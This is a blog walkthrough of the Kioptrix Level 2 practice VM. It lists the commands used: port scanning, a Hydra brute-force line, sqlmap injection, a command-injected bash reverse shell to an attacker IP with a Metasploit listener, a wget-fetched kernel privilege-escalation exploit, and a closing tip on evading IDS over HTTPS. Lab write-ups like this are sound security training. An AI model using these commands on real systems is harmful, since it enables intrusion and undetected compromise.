---
layout: post
title: Kioptrix Level 2
date: 2018-08-12
---
# Kioptrix Level 2

Just a short walkthrough on Kioptrix level 2.

```
Step 1: enumeration & information Gathering.
```

Portscan results:
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
111/tcp  open  rpcbind syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
631/tcp  open  ipp     syn-ack ttl 64
812/tcp  open  unknown syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```
Inspecting the Web Server reveals a login page to the administrative console.

![](/img/kioptrixlvl2/kioptrixlvl2_login.png)

Using burp suite we set up a proxy to inspect the form Request paramaeters passed to the server when attempting to login.

![](/img/kioptrixlvl2/kioptrixlvl2_form.png)

```
Step 2: Enumeration Phase.
```

Using Hydra we can begin the Brute force process, initially the parameters passed into the web form are successful, these are obviously false positives. The web server on authentication success will likely redirect the request via a 302 or 303 HTTP response code.

![](/img/kioptrixlvl2/Try_hyd1.png)

Updating the Script parameters with:
```
hydra -t 4 -vV -l admin -P /usr/share/john/password.lst 192.168.1.43 http-post-form
"/index.php:uname=^USER^&psw=^PASS^&btnLogin=Login:S=302"
```
![](/img/kioptrixlvl2/Try_hyd2.png)

While trying to Brute force we can also try to see if this particular login page is vulnerable to a simple SQL injection attack. We know the backend is running mysql based on our earlier nmap scan.

Copying the payload from Burp suite to a text file, we can use the payload parameters in a sql injection tool such as "sqlmap."

Payload Data ->
```
POST /index.php HTTP/1.1
Host: 192.168.1.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.43/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

uname=admin&psw=password&btnLogin=Login
```
Using info from the above data we can begin testing for a SQL injection using the sqlmap tool mentioned earlier.

```
sqlmap -u 'http://192.168.1.43/index.php' --data='uname=admin&psw=admin' --level=3 --risk=3`
```
![](/img/kioptrixlvl2/SQLinj.png)

At this point, it is fairly obvious how we are going to get a shell from this machine. Since once logged in we have access to a network ping tool which is directly calling an Operating System program. We can simply try to use command path injection to bypass the ping command and call our own tool that resides on the operating system.

![](/img/kioptrixlvl2/SQLinj2.png)

running which through the interface results in the location of python on the OS!

![](/img/kioptrixlvl2/whichpy.png)

```
Step 3: Exploitation
```

We then set up a listener on metasploit (reverse_tcp) and then we can inject the command to spawn a reverse shell.

```
use exploit/multi/handler
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.1.42
set LPORT 4444
```
Now injecting the command through index.php page we bypassed ->
```
;bash -i >& /dev/tcp/192.168.1.42/4444 0>&1
```
We are able to spawn a reverse shell.

![](/img/kioptrixlvl2/rev_shell.png)

Now that we have a reverse shell, all that's left is to obtain root (privledge escalation).

From an earlier scan we know that we are on CentOS, checking the Kernel version on the target reveals it is likely vulnerable to CVE-2009-2692.
```
uname -r
2.6.9-55.EL
```
Using wget we can simply query the raw exploit code from an apache server I set up on the client machine and then try to compile it on our target system through the reverse shell.

![](/img/kioptrixlvl2/root.png)

Compilation and execution of the C code, results in successful privledge escalation due to the vulnerable kernel.

Unfortunatley for us, all of the enumeration attempts and exploits were being recorded the entire time. The IDS/IPS system was in only in an Alert-Mode state, however it certainly must of rang some bells and whistles... =)

![](/img/kioptrixlvl2/recording.png)

Running the very same set of exploits, but on the HTTPS socket would of entirley prevented these alerts (unless there was a prescence of a WAF) and blinded the security operations center from seeing these types of requests.

We will dig into how we can better or even prevent attack detection in the near future.
